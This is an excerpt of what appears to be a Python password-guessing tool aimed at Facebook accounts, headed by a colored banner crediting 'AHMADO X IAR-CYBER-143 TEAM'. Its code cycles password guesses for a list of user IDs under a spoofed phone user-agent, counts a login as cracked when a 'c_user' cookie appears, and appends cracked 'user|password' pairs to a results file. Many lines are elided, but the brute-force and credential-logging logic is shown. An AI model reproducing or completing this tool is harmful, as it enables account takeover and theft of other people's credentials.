...
logo =                                          """   
\033[1;91m     d8b.  db   db .88b  d88.  .d8b.  d8888b.  .d88b.
\033[1;92m   d8' `8b 88   88 88'YbdP`88 d8' `8b 88  `8D .8P  Y8. 
\033[1;93m   88ooo88 88ooo88 88  88  88 88ooo88 88   88 88    88
\033[1;94m   88~~~88 88~~~88 88  88  88 88~~~88 88   88 88    88 
\033[1;95m   88   88 88   88 88  88  88 88   88 88  .8D `8b  d8'  
\033[1;92m   YP   YP YP   YP YP  YP  YP YP   YP Y8888D'  `Y88P' 
\033[0;96m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
\033[1;31m[•] AUTHOR    :\033[1;31m AHMADO X IAR-CYBER-143 TEAM
\033[1;32m[•] GITHUB    :\033[1;32m AHMADO
\033[1;33m[•] WHATSAPP  :\033[1;33m0335XXXXXX  
\033[1;34m[•] TOOLS     :\033[1;34m RENDO
\033[1;35m[•] VERSION   :\033[1;35m 0.8
\033[0;96m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back AHMADO Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AHMADO] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AHMAMADO_OK.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(logo)
            print(47*"-")
            print('\033[1;33m TOTAL IDZ : %s ' % len(self.id))
